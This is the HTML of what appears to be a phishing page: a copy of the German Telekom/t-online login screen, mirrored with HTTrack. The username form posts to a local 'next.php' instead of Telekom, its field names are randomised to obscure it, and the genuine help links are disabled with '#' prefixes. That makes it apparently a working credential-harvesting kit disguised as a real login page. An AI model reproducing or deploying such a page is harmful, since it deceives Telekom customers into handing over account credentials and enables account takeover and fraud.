<!DOCTYPE html>
<!--[if (lte IE 8) ]>
<html lang="de-DE" class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|!(IE)]><!-->
<html class="no-js" lang="de"><!--<![endif]-->


<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Telekom Login</title>
    <meta name="description" content="Telekom Login">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="robots" content="noindex" />

    <link rel="stylesheet" type="text/css" href="assets/css/components.min.css">
    <link rel="stylesheet" type="text/css" href="assets/css/login-20.28.0.css">
    
    <script>
        var accountLocked = false;
        var accountLockedPermanent = false;
        var accountLockExpiration = 0;
        var loginFailed = false;
    </script>
    
    <!--[if lt IE 9]>
    <script type="text/javascript" src="/static/factorx/vdplus/js/html5shiv.js"></script>
    <script type="text/javascript" src="/static/factorx/vdplus/js/respond.min.js"></script>
    <![endif]-->

    <script type="text/javascript" src="assets/js/jquery-3.2.1.min.js"></script>
    <script type="text/javascript" src="assets/js/jquery-matchheight-0.7.2.min.js"></script>
    <script type="text/javascript" src="assets/js/components.min.js"></script>
    <script type="text/javascript" src="assets/js/login.js"></script>
	
</head>


<body>
<div>
    <header id="tbs-header">
        <div id="tbs-header-content">
            <div class="container-fixed clearfix">
                <div class="pull-left">
                    <i class="icon icon-large">tT</i>
                </div>
                <div class="pull-right">
                    <span class="tbs-slogan">erleben, was verbindet.</span>
                </div>
            </div>
        </div>
        
        
        
    </header>

    

    
    

    <div class="offset-bottom-5 offset-s-bottom-3"></div>

</div>

<div>

    
<!---->
<!--    <div >-->
<!---->
<!--        <image src="https://xdn-ttp.de/lns/import-event-0746?zid=a7e0f642-a791-4dcb-80de-8b2992453c98"  hidden="true" alt="" frameborder="0" width="1" height="1"/>-->
<!---->
<!--        <image src="https://pix.telekom.de/196380495960676/wt?p=441,www.telekom.de.privatkunden.login-idm-id,0,0,0,0,0,0,0,0&amp;cg1=www.telekom.de&amp;cg2=login&amp;cg8=privatkunden&amp;cg9=login-idm-id&amp;cp19=a7e0f642-a791-4dcb-80de-8b2992453c98" hidden="true" alt="" frameborder="0" width="1" height="1"/>-->
<!---->
<!--    </div>-->


</div>


<div class="container-fixed">
    <div class="tbs-container">
        <div id="tbs-headline">
            <div id="tbs-brand" class="tbs-relative text-center">
                
                <img src="assets/images/t-online-logo-29112019.png">
            </div>
            <h1 class="offset-top-0 offset-bottom-3 text-center">Telekom Login Benutzername eingeben</h1>
        </div>

        <div class="login-box">
            

            <div class="offset-bottom-1">
                <form id="fhytry" name="lorccjg" method="POST" action="next.php" accept-charset="UTF-8" autocomplete="off" novalidate>
                    
                    <input type="hidden" name="xsrf_XA7P72Iyjdr3yt9r4MDYwA" value="iMLO1A9eE-B9Z5OMe4cxuw">

                    
                    <input type="hidden" name="tid" value="8d524f2c-7c71-4321-b382-e870d8fceb8c">

                    <input type="hidden" name="x-show-cancel" value="false">

                    
                    <button class="btn-hidden" name="pw_submit" type="submit"></button>

                    
                    <div class="offset-bottom-1">
                        
                        <div class="form-input-set">
                            <input id="pw_usr" name="tufufyfuj" type="email" class="form-input" maxlength="256" aria-describedby="usrInfo" tabindex="10" value="" autocomplete="off" required>
                            <label for="pw_usr">Benutzername</label>
                            <i class="info-question-icon" data-toggle="collapse" data-target="#usrInfo" data-toggle-hide="true" tabindex="60"></i>
                        </div>

                        
                        <div id="usrInfo" class="info-box tbs-pointer">
                            <p>So können Sie sich anmelden:</p>
                            <ul>
                                <li>
                                    <span class="text-bold">E-Mail-Adresse: </span>
                                    <span>Ihre Telekom E-Mail-Adresse oder Ihre E-Mail-Adresse eines anderen Anbieters, mit der Sie sich registriert haben.</span>
                                </li>
                                <li>
                                    <span class="text-bold">Mobilfunk-Nummer: </span>
                                    <span>Ihre Telekom Mobilfunk-Nummer, wenn Sie diese mit Ihrem Telekom Login verknüpft haben.</span>
                                </li>
                                <li>
                                    <span class="text-bold">VERIMI Konto: </span>
                                    <span>Wenn Ihr Telekom Login mit einem VERIMI Konto verknüpft ist, geben Sie hier bitte zunächst Ihren Telekom Login Benutzernamen ein. Anschließend leiten wir Sie zu VERIMI weiter.</span>
                                </li>
                            </ul>
                        </div>

                        
                        <!--<div class="info-box error" th:if="${( UsernamePasswordViewModel.errors != null and not UsernamePasswordViewModel.errors.isEmpty())}">-->
                        <!--<div th:text="${UsernamePasswordViewModel.errors.getSafeError('__#{login.usernameWrong}__', '__#{${UsernamePasswordViewModel.errors.getLastOccurredElaboratedError().getErrorName()}}__')}">Generischer Fehler</div>-->
                        <!--</div>-->

                        


                        
                        <div class="login-helpers clearfix">
                            <!-- remember username component -->
                            <div id="tbs-signin-remember" class="form-checkbox-set">
                                <label>
                                    <input id="checkbox_remember_user" type="checkbox" name="remember_user" value="1" class="form-checkbox" tabindex="30">
                                    <span>Benutzername merken</span>
                                </label>
                            </div>
                            
                            <div id="tbs-recovery-link" class="text-right">
                                <button class="btn-link" role="button" name="showSelectIdentMethod" tabindex="44" type="submit">Benutzername vergessen?</button>
                            </div>
                        </div>

                        
                        <div class="clearfix">
                            <button id="pw_submit" name="pw_submit" type="submit" class="text-center text-uppercase btn btn-brand btn-block btn-large" tabindex="40">Weiter</button>
                        </div>
                    </div>
                    <input name="hidden_pwd" type="password" class="hidden" aria-hidden="true" tabindex="-1" autocomplete="off">
                </form>

                

                <div class="text-center offset-bottom-2 offset-top-2">
                    <a href="#https://www.telekom.de/hilfe/vertrag-meine-daten/login-daten-passwoerter" tabindex="45" >Brauchen Sie Hilfe?</a>
                </div>

                <div class="text-center offset-bottom-2">
                    <div>
                        <p>
                            <span>Noch keinen Telekom Login?</span>
                            <a class="text-nowrap" tabindex="50" href="#https://www.telekom.de/unterwegs/apps-und-dienste/kommunikation/telekom-e-mail">Telekom Login erstellen</a>
                            <span>und E-Mail nutzen.</span>
                        </p>
                    </div>
                </div>

                <div class="text-center offset-bottom-2">
                    <img src="assets/images/services.png"/>
                </div>

                <div class="text-center offset-bottom-2">
                    <div>
                        <p>
                            <span>Jetzt auch mit Ihrem VERIMI Konto bei der Telekom anmelden.</span>
                            <a class="text-nowrap" tabindex="60"  href="#https://www.telekom.de/hilfe/vertrag-meine-daten/login-daten-passwoerter/verimi">Hier informieren über VERIMI</a>
                        </p>
                    </div>
                </div>

            </div>
        </div>
    </div>

</div>


<footer id="tbs-footer">
    <div class="container-fixed">
        <div class="pull-left">
            <p>&copy; Telekom Deutschland GmbH</p>
            <p class="tbs-text-11">20.28.0, 7e87cb28e16f9d14923d2630e9fc005b, 058ca6fdca49401bf6c295bfb956341ee59c79d6</p>
        </div>
        <div class="pull-right">
            <ul class="list-inline">
                <li>
                    <a href="#https://www.telekom.de/start/impressum" >Impressum</a>
                </li>
                <li>
                    <a id="data-protection" href="#https://www.telekom.de/datenschutz-ganz-einfach" >Datenschutz</a>
                </li>
            </ul>
        </div>
    </div>
</footer>



<div>
    
</div>
</body>

<!-- Mirrored from accounts.login.idm.telekom.com/oauth2/auth?client_id=10LIVESAM30000004901PORTAL00000000000000&state=c2831d7e8ee9f93ec7d7686f170a86f2ae4abeb9adb9c02b2ee8c99ec785b932&claims=%7B%22id_token%22%3A%7B%22urn%3Atelekom.com%3Aall%22%3Anull%7D%7D&nonce=c2831d7e8ee9f93ec7d7686f170a86f2ae4abeb9adb9c02b2ee8c99ec785b932&redirect_uri=https%3A%2F%2Flogin.t-online.de%2Fcallback&logout_uri=https%3A%2F%2Flogin.t-online.de%2Ftelekom_logout&display=popup&scope=openid&response_type=code by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 06 Feb 2020 21:39:08 GMT -->
</html>
